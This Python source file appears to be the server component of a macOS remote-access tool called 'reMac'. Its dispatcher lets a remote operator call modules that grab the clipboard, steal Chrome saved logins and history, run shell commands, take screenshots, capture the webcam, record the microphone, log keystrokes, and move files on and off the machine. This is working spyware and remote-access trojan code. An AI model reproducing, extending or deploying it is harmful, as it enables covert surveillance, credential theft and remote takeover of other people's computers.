# -*- coding: utf-8 -*-
# __author__ = "J3T3D0nn3r"
# __license__ = "GPLv3"

import sys
from apps.server.modules import mod_clipboard, mod_keylogger, mod_hello, mod_chrome_logins
from apps.server.modules import mod_chrome_history
from apps.server.modules import mod_shellcmd
from apps.server.modules import mod_screenshot
from apps.server.modules import mod_webcam
from apps.server.modules import mod_recmic
from apps.server.modules import mod_modHelp
from apps.server.modules import mod_info
from apps.server.modules import mod_download
from apps.server.modules import mod_upload

from apps.libs.reMac_libbase import reMac_libbase


reMacModules = {
    'hw': [mod_hello.mod_hello(), 'helloworld', 'Call HelloWorld module', 'hw'],
    'cb': [mod_clipboard.mod_clipboard(), 'clipboard', 'Call clipboard module', 'cb'],
    'ch': [mod_chrome_history.mod_chrome_history(), 'chromehist', 'Call Chrome-History module', 'ch'],
    'cl': [mod_chrome_logins.mod_chrome_logins(), 'chromelogin', 'Call Chrome-Logins module', 'cl'],
    'sh': [mod_shellcmd.mod_shellcmd(), 'shellcmd', 'Call shell command module', 'sh <cmd to send>'],
    'sc': [mod_screenshot.mod_screenshot(), 'screenshot', 'Call screenshot module', 'sc'],
    'wc': [mod_webcam.mod_webcam(), 'webcam', 'Call webcam module', 'wc [-t <seconds to warmup>]'],
    'kl': [mod_keylogger.mod_keylogger(), 'keylogger', 'Call keylogger module (NOT WORKING YET)', 'kl'],
    'rm': [mod_recmic.mod_recmic(), 'recmic', 'Call record microphone module', 'rm [-t <seconds to record>]'],
    'mh': [mod_modHelp.mod_modHelp(), 'modHelp', 'Call server modules help module', 'mh <module>'],
    'in': [mod_info.mod_info(), 'info', 'Call info module', 'in'],
    'dl': [mod_download.mod_download(), 'download', 'Call download module (to app "/tmp")', 'dl <remote filename>'],
    'ul': [mod_upload.mod_upload(), 'upload', 'Call upload module (to app "/tmp")', 'ul <local filename>']
}


class reMac_libserver(reMac_libbase):
    def __init__(self, selector, sock, addr):
        reMac_libbase.__init__(self, selector, sock, addr)
        self._recv_buffer = b""
        self._send_buffer = b""
        self._jsonheader_len = None
        self.jsonheader = None
        self.request = None
        self.response_created = False

    def _read(self):
        try:
            # Should be ready to read
            data = self.sock.recv(4096)
        except BlockingIOError:
            # Resource temporarily unavailable (errno EWOULDBLOCK)
            pass
        else:
            if data:
                self._recv_buffer += data
            else:
                raise RuntimeError("Peer closed.")

    def _write(self):
        if self._send_buffer:
            # print("sending", repr(self._send_buffer), "to", self.addr)
            try:
                # Should be ready to write
                sent = self.sock.send(self._send_buffer)
            except BlockingIOError:
                # Resource temporarily unavailable (errno EWOULDBLOCK)
                pass
            else:
                self._send_buffer = self._send_buffer[sent:]
                # Close when the buffer is drained. The response has been sent.
                if sent and not self._send_buffer:
                    self.close()

    def processInput(self, input, value = ""):
        if input == "q":  # or input == "quit":
            sys.exit(1)
        elif input == "h":  # or input == "help":
            # print_help()
            pass
        elif input == "hw" \
                or input == "cb" \
                or input == "ch" \
                or input == "cl" \
                or input == "sc" \
                or input == "wc" \
                or input.startswith("rm") \
                or input == "in" \
                or input == "d":  # or input == "help":
            return reMacModules[input][0].run_mod()
        elif input == "dl" \
                or input == "ul":
            return reMacModules[input][0].run_mod(input, value)
        elif input == "sh":
            return reMacModules["sh"][0].run_cmd(input, value)
        elif input.startswith("mh"):
            return reMacModules["mh"][0].print_client_help("reMac", reMacModules, value)
        else:
            print(f"Command '{input}' NOT FOUND! Check the following command list")
            # print_help()

    def _create_response_json_content(self):
        action = self.request.get("action")
        value = self.request.get("value")
        if action == "hw" \
                or action == "cb" \
                or action == "ch" \
                or action == "cl" \
                or action == "sh" \
                or action == "sc" \
                or action == "wc" \
                or action == "rm" \
                or action == "in" \
                or action == "dl" \
                or action.startswith("mh"):
            answer = self.processInput(action, value)
            if action == "dl":
                filename = value.split("/")
                content = {"action": action, "result": answer, "filename": filename[len(filename)-1]}
            else:
                content = {"action": action, "result": answer}
        elif action == "ul":
            answer = self.processInput(action, value)
            content = {"action": action, "result": answer}
        else:
            content = {"action": action, "result": f'Error: invalid action "{action}".'}
        content_encoding = "utf-8"
        response = {
            "content_bytes": self._json_encode(content, content_encoding),
            "content_type": "text/json",
            "content_encoding": content_encoding,
        }
        return response

    def _create_response_binary_content(self):
        response = {
            "content_bytes": b"First 10 bytes of request: "
            + self.request[:10],
            "content_type": "binary/custom-server-binary-type",
            "content_encoding": "binary",
        }
        return response

    def read(self):
        sret = ""
        self._read()

        if self._jsonheader_len is None:
            self.process_protoheader()

        if self._jsonheader_len is not None:
            if self.jsonheader is None:
                self.process_jsonheader()

        if self.jsonheader:
            if self.request is None:
                sret = self.process_request()
        return sret

    def write(self):
        if self.request:
            if not self.response_created:
                self.create_response()

        self._write()

    def process_request(self):
        sret = ""
        content_len = self.jsonheader["content-length"]
        if not len(self._recv_buffer) >= content_len:
            return sret
        data = self._recv_buffer[:content_len]
        self._recv_buffer = self._recv_buffer[content_len:]
        if self.jsonheader["content-type"] == "text/json":
            encoding = self.jsonheader["content-encoding"]
            self.request = self._json_decode(data, encoding)
            sret = f"received request {repr(self.request)} from {self.addr}"
            print(sret)
        else:
            # Binary or unknown content-type
            self.request = data
            print(
                f'received {self.jsonheader["content-type"]} request from',
                self.addr,
            )
        # Set selector to listen for write events, we're done reading.
        self._set_selector_events_mask("w")
        return sret

    def create_response(self):
        if self.jsonheader["content-type"] == "text/json":
            response = self._create_response_json_content()
        else:
            # Binary or unknown content-type
            response = self._create_response_binary_content()
        message = self._create_message(**response)
        self.response_created = True
        self._send_buffer += message
